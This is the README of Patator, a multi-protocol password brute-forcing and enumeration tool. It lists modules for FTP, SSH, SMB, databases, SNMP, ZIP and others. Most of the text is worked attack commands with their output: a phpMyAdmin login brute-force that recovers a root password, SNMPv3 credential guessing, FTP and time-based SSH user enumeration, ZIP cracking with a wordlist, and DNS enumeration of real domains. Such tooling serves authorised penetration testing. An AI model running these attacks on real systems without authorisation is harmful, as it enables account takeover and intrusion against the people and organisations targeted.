Patator is a multi-purpose brute-forcer, with a modular design and a flexible usage.

Currently it supports the following modules:

* ftp_login     : Brute-force FTP
* ssh_login     : Brute-force SSH
* telnet_login  : Brute-force Telnet
* smtp_login    : Brute-force SMTP
* smtp_vrfy     : Enumerate valid users using the SMTP VRFY command
* smtp_rcpt     : Enumerate valid users using the SMTP RCPT TO command
* finger_lookup : Enumerate valid users using Finger
* http_fuzz     : Brute-force HTTP/HTTPS
* pop_login     : Brute-force POP
* pop_passd     : Brute-force poppassd (not POP3)
* imap_login    : Brute-force IMAP
* ldap_login    : Brute-force LDAP
* smb_login     : Brute-force SMB
* smb_lookupsid : Brute-force SMB SID-lookup
* rlogin_login  : Brute-force rlogin
* vmauthd_login : Brute-force VMware Authentication Daemon
* mssql_login   : Brute-force MSSQL
* oracle_login  : Brute-force Oracle
* mysql_login   : Brute-force MySQL
* mysql_query   : Brute-force MySQL queries
* pgsql_login   : Brute-force PostgreSQL
* vnc_login     : Brute-force VNC
* dns_forward   : Brute-force DNS
* dns_reverse   : Brute-force DNS (reverse lookup subnets)
* snmp_login    : Brute-force SNMPv1/2 and SNMPv3
* unzip_pass    : Brute-force the password of encrypted ZIP files
* keystore_pass : Brute-force the password of Java keystore files
* umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes

The name "Patator" comes from http://www.youtube.com/watch?v=xoBkBvnTTjo

Patator is NOT script-kiddie friendly, please read the README inside patator.py before reporting.

@lanjelot

* FTP : User enumeration on a too verbose server

```
$ patator.py ftp_login host=10.0.0.1 user=FILE0 password=qsdf 0=logins.txt -x ignore:mesg='Login incorrect.'
22:27:29 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 22:27 EST
22:27:29 patator    INFO - 
22:27:29 patator    INFO - code  size | candidate                          |   num | mesg
22:27:29 patator    INFO - ----------------------------------------------------------------------
22:27:30 patator    INFO - 530   18   | root                               |     1 | Permission denied.
22:27:31 patator    INFO - 230   17   | ftp                                |    13 | Login successful.
22:27:34 patator    INFO - 530   18   | admin                              |    23 | Permission denied.
22:27:34 patator    INFO - 530   18   | oracle                             |    31 | Permission denied.
22:28:02 patator    INFO - 530   18   | test                               |   179 | Permission denied.
22:28:21 patator    INFO - 230   17   | anonymous                          |   283 | Login successful.
22:28:26 patator    INFO - 530   18   | ftpuser                            |   357 | Permission denied.
22:28:41 patator    INFO - 530   18   | nobody                             |   402 | Permission denied.
...
```

* HTTP : Brute-force phpMyAdmin logon

```
$ http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&lang=en' 0=combos.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
10:55:50 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 10:55 EST
10:55:50 patator    INFO - 
10:55:50 patator    INFO - code size:clen     | candidate                        |   num | mesg
10:55:50 patator    INFO - ----------------------------------------------------------------------
10:55:50 patator    INFO - 200  8209:7075     | root:                            |    22 | HTTP/1.1 200 OK
10:55:51 patator    INFO - 200  3838:2566     | root:p@ssw0rd                    |    44 | HTTP/1.1 200 OK
^C
10:55:52 patator    INFO - Hits/Done/Skip/Fail/Size: 2/125/0/0/2342, Avg: 47 r/s, Time: 0h 0m 2s
10:55:52 patator    INFO - To resume execution, pass --resume 12,13,12,13,12,12,13,13,13,12
```

Payload #22 was a false positive:

```
$ cat /tmp/qsdf/22_200_8209\:7075.txt
...
<div class="error">Login without a password is forbidden by configuration (see AllowNoPassword)</div>
```

* SNMPv3 : Find valid usernames

```
$ snmp_login host=10.0.0.1 version=3 user=FILE0 0=logins.txt -x ignore:mesg=unknownUserName
17:51:06 patator    INFO - Starting Patator v0.5
17:51:06 patator    INFO - 
17:51:06 patator    INFO - code  size | candidate                          |   num | mesg
17:51:06 patator    INFO - ----------------------------------------------------------------------
17:51:11 patator    INFO - 0-0   11   | robert                             |    55 | wrongDigest
17:51:12 patator    INFO - Progress:  20% (70/345) | Speed: 10 r/s | ETC: 17:51:38 (00:00:26 remaining)
17:51:33 patator    INFO - 0-0   11   | myuser                             |   311 | wrongDigest
17:51:36 patator    INFO - Hits/Done/Skip/Fail/Size: 2/345/0/0/345, Avg: 11 r/s, Time: 0h 0m 30s
```

* SNMPv3 : Find valid passwords

```
$ snmp_login host=10.0.0.1 version=3 user=robert auth_key=FILE0 0=passwords_8+.txt -x ignore:mesg=wrongDigest
17:52:15 patator    INFO - Starting Patator v0.5
17:52:15 patator    INFO - 
17:52:15 patator    INFO - code  size | candidate                          |   num | mesg
17:52:15 patator    INFO - ----------------------------------------------------------------------
17:52:16 patator    INFO - 0-0   69   | password123                        |    16 | Linux thug 2.6.36-gentoo #5 SMP Fri Aug 12 14:49:51 CEST 2011 i686
17:52:17 patator    INFO - Hits/Done/Skip/Fail/Size: 1/50/0/0/50, Avg: 38 r/s, Time: 0h 0m 1s
```

* DNS : Forward lookup

```
$ dns_forward name=FILE0.hsc.fr 0=names.txt -x ignore:code=3
03:18:46 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 03:18 PMT
03:18:46 patator    INFO - 
03:18:46 patator    INFO - code  size | candidate                          |   num | mesg
03:18:46 patator    INFO - ----------------------------------------------------------------------
03:18:46 patator    INFO - 0     41   | www                                |     4 | NOERROR [www.hsc.fr. IN A 217.174.211.25]
03:18:46 patator    INFO - 0     81   | mail                               |    32 | NOERROR [mail.hsc.fr. IN CNAME itesec.hsc.fr.][itesec.hsc.fr. IN A 192.70.106.33]
03:18:46 patator    INFO - 0     44   | webmail                            |    62 | NOERROR [webmail.hsc.fr. IN A 192.70.106.95]
03:18:46 patator    INFO - 0     93   | test                               |    54 | NOERROR [hsc.fr. IN SOA itesec.hsc.fr. hostmaster.hsc.fr. 2012012301 21600 3600 1209600 3600]
03:18:46 patator    INFO - 0     40   | wap                                |    66 | NOERROR [wap.hsc.fr. IN A 192.70.106.33]
03:18:46 patator    INFO - 0     85   | extranet                           |   131 | NOERROR [extranet.hsc.fr. IN CNAME itesec.hsc.fr.][itesec.hsc.fr. IN A 192.70.106.33]
03:18:46 patator    INFO - 0     81   | news                               |   114 | NOERROR [news.hsc.fr. IN CNAME itesec.hsc.fr.][itesec.hsc.fr. IN A 192.70.106.33]
03:18:46 patator    INFO - 0     93   | mailhost                           |   137 | NOERROR [mailhost.hsc.fr. IN A 192.70.106.33][mailhost.hsc.fr. IN AAAA 2001:7a8:1155:2::abcd]
03:18:46 patator    INFO - 0     47   | lists                              |   338 | NOERROR [lists.hsc.fr. IN MX 10 itesec.hsc.fr.]
03:18:46 patator    INFO - 0     93   | fr                                 |   319 | NOERROR [hsc.fr. IN SOA itesec.hsc.fr. hostmaster.hsc.fr. 2012012301 21600 3600 1209600 3600]
03:18:47 patator    INFO - 0     40   | gl                                 |   586 | NOERROR [gl.hsc.fr. IN A 192.70.106.103]
Records ------------------------------------------
                  extranet.hsc.fr.   IN CNAME   itesec.hsc.fr.
                        gl.hsc.fr.   IN A       192.70.106.103
                           hsc.fr.   IN SOA     itesec.hsc.fr. hostmaster.hsc.fr. 2012012301 21600 3600 1209600 3600
                    itesec.hsc.fr.   IN A       192.70.106.33
                     lists.hsc.fr.   IN MX      10 itesec.hsc.fr.
                      mail.hsc.fr.   IN CNAME   itesec.hsc.fr.
                  mailhost.hsc.fr.   IN A       192.70.106.33
                  mailhost.hsc.fr.   IN AAAA    2001:7a8:1155:2::abcd
                      news.hsc.fr.   IN CNAME   itesec.hsc.fr.
                       wap.hsc.fr.   IN A       192.70.106.33
                   webmail.hsc.fr.   IN A       192.70.106.95
                       www.hsc.fr.   IN A       217.174.211.25
Hostmap ------------------------------------------
                   mailhost.hsc.fr 2001:7a8:1155:2::abcd
                   mailhost.hsc.fr 192.70.106.33
                        wap.hsc.fr 192.70.106.33
                     itesec.hsc.fr 192.70.106.33
                   extranet.hsc.fr
                       mail.hsc.fr
                       news.hsc.fr
                    webmail.hsc.fr 192.70.106.95
                         gl.hsc.fr 192.70.106.103
                        www.hsc.fr 217.174.211.25
Domains ------------------------------------------
                            hsc.fr 10
Networks -----------------------------------------
                                   2001:7a8:1155:2::abcd
                                   192.70.106.x
                                   217.174.211.25
03:18:53 patator    INFO - Hits/Done/Skip/Fail/Size: 11/1000/0/0/1000, Avg: 133 r/s, Time: 0h 0m 7s
```

Also notice that test.hsc.fr. is the start of a new zone because we got NOERROR and no IP address.

* DNS : Reverse lookup two netblocks owned by Google

```
$ dns_reverse host=NET0 0=216.239.32.0-216.239.47.255,8.8.8.0/24 -x ignore:code=3 -x ignore:fgrep!=google.com -x ignore:fgrep=216-239-
03:24:22 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 03:24 PMT
03:24:22 patator    INFO - 
03:24:22 patator    INFO - code  size | candidate                          |   num | mesg
03:24:22 patator    INFO - ----------------------------------------------------------------------
03:24:22 patator    INFO - 0     46   | 216.239.32.10                      |    11 | NOERROR [216.239.32.10 IN PTR ns1.google.com.]
03:24:22 patator    INFO - 0     45   | 216.239.32.11                      |    12 | NOERROR [216.239.32.11 IN PTR ns.google.com.]
03:24:22 patator    INFO - 0     48   | 216.239.32.15                      |    16 | NOERROR [216.239.32.15 IN PTR time1.google.com.]
03:24:23 patator    INFO - 0     47   | 216.239.33.5                       |   262 | NOERROR [216.239.33.5 IN PTR proxy.google.com.]
03:24:23 patator    INFO - 0     47   | 216.239.33.12                      |   269 | NOERROR [216.239.33.12 IN PTR dns1.google.com.]
03:24:23 patator    INFO - 0     51   | 216.239.33.22                      |   279 | NOERROR [216.239.33.22 IN PTR transfer.google.com.]
03:24:23 patator    INFO - 0     50   | 216.239.33.20                      |   277 | NOERROR [216.239.33.20 IN PTR esc-out.google.com.]
03:24:23 patator    INFO - 0     46   | 216.239.34.10                      |   523 | NOERROR [216.239.34.10 IN PTR ns2.google.com.]
03:24:23 patator    INFO - 0     48   | 216.239.34.15                      |   528 | NOERROR [216.239.34.15 IN PTR time2.google.com.]
^C
Records ------------------------------------------
                     216.239.32.10       IN PTR      ns1.google.com.
                     216.239.32.11       IN PTR      ns.google.com.
                     216.239.32.15       IN PTR      time1.google.com.
                     216.239.33.12       IN PTR      dns1.google.com.
                     216.239.33.20       IN PTR      esc-out.google.com.
                     216.239.33.22       IN PTR      transfer.google.com.
                      216.239.33.5       IN PTR      proxy.google.com.
                     216.239.34.10       IN PTR      ns2.google.com.
                     216.239.34.15       IN PTR      time2.google.com.
Hostmap ------------------------------------------
                    ns1.google.com 216.239.32.10
                     ns.google.com 216.239.32.11
                  time1.google.com 216.239.32.15
                  proxy.google.com 216.239.33.5
                   dns1.google.com 216.239.33.12
                esc-out.google.com 216.239.33.20
               transfer.google.com 216.239.33.22
                    ns2.google.com 216.239.34.10
                  time2.google.com 216.239.34.15
Domains ------------------------------------------
                        google.com 9
Networks -----------------------------------------
                                   216.239.32.x
                                   216.239.33.x
                                   216.239.34.x
03:24:29 patator    INFO - Hits/Done/Skip/Fail/Size: 9/872/0/0/4352, Avg: 115 r/s, Time: 0h 0m 7s
03:24:29 patator    INFO - To resume execution, pass --resume 91,75,93,73,84,95,94,95,83,89
```

* ZIP : Crack a password-protected ZIP file (older pkzip encryption used not to be supported in JtR)

```
$ unzip_pass zipfile=challenge1.zip password=FILE0 0=rockyou.dic -x ignore:code!=0 
10:54:29 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 10:54:29 PMT
10:54:29 patator    INFO - 
10:54:29 patator    INFO - code  size | candidate                          |   num | mesg
10:54:29 patator    INFO - ----------------------------------------------------------------------
10:54:30 patator    INFO - 0     82   | love                               |   387 | 0 [82] No errors detected in compressed data of challenge1.zip.
^C
10:54:31 patator    INFO - Hits/Done/Skip/Fail/Size: 1/1589/0/0/5000, Avg: 699 r/s, Time: 0h 0m 2s
10:54:31 patator    INFO - To resume execution, pass --resume 166,164,165,166,155,158,148,158,155,154
```

* SSH : Time-based user enumeration (using git version)

```
$ python -c "print('A'*5000)" > /tmp/As.txt
$ ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=@/tmp/As.txt -x ignore:time=0-3.5 -t 1
16:12:39 patator    INFO - Starting Patator v0.6-beta (http://code.google.com/p/patator/) at 2013-07-13 16:12 EST
16:12:39 patator    INFO -
16:12:39 patator    INFO - code  size   time | candidate                          |   num | mesg
16:12:39 patator    INFO - ----------------------------------------------------------------------
16:12:53 patator    INFO - 1     22   13.643 | root                               |     1 | Authentication failed.
16:12:57 patator    INFO - 1     22   15.404 | support                            |    18 | Authentication failed.
16:12:58 patator    INFO - 1     22   13.315 | testuser                           |    25 | Authentication failed.
16:13:06 patator    INFO - 1     22    7.377 | michael                            |    38 | Authentication failed.
...
```

Tested against openssh 6.2p2-1 default install on archlinux

